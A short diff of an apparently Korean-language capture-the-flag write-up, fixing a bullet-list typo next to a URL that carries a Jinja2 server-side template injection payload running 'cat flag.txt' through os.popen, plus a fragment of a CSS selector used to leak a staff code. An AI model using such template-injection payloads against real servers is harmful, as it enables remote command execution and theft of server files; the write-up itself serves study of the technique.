@@ -90,6 +90,6 @@ blue;} input#staff_code[value^=a] {
 http://~/list?code=찾은스탭코드&motd={% print url_for.__globals__['os'].popen('cat flag.txt').read() %}
 ```
 
--실행 시 서버 내부의 flag.txt 내용을 획득할 수 있습니다.
+- 실행 시 서버 내부의 flag.txt 내용을 획득할 수 있습니다.
 
 <img width="1508" height="495" alt="flag 획득" src="https://github.com/user-attachments/assets/fef338c4-126e-473f-b0c8-d185b31136d4" /> *그림 6. SSTI를 통해 flag.txt 내용을 출력한 화면*
